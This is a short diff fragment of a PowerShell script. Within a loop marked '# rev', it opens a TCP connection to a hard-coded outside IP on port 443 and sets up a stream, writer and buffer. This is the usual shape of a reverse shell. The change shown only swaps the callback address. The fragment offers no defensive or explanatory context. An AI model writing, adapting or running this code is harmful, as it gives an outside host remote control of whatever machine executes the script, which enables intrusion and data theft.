@@ -29,7 +29,7 @@ for ($iteration = 1; $iteration -le 16; $iteration++) {
 
     # rev
     try {
-        $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
+        $client = New-Object System.Net.Sockets.TCPClient("200.28.162.200",443)
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream)
         $buffer = New-Object Byte[] 1024
